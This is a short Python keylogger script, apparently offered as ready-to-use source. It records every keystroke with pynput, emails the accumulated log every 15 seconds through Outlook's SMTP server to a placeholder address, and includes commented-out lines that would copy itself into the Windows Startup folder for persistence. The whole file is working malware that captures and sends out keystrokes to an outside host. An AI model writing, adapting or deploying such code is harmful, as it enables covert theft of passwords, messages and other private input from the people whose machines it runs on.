import smtplib
import threading
import pynput.keyboard
from email.mime.text import MIMEText
import os
import time

# user = os.getlogin()
# currentDic = os.getcwd()
# os.chdir(f"C://Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
# os.system(f"cp {currentDic}/keylogger.py keylogger.py")

log = ""

def callBackFunc(key):
    global log

    try:
        log = log + str(key.char)
    
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)

    except:
        pass

    print(log)

def send_email(loglar):
    log_str = str(loglar, 'utf-8')
    message = MIMEText(log_str)
    message['Subject'] = 'Keylogger Loglari'
    message['From'] = 'your mail'
    message['To'] = 'your mail'

    email_server = smtplib.SMTP("smtp-mail.outlook.com",587)
    email_server.ehlo()
    email_server.starttls()
    email_server.login("your mail","your password")
    email_server.sendmail("your mail","your mail",message.as_string())
    email_server.quit()

def threadFunc():
    global log
    send_email(log.encode('utf-8'))
    log = ""
    timer = threading.Timer(15, threadFunc)
    timer.start()

key_listener = pynput.keyboard.Listener(on_press=callBackFunc)
with key_listener:
    threadFunc()
    key_listener.join()
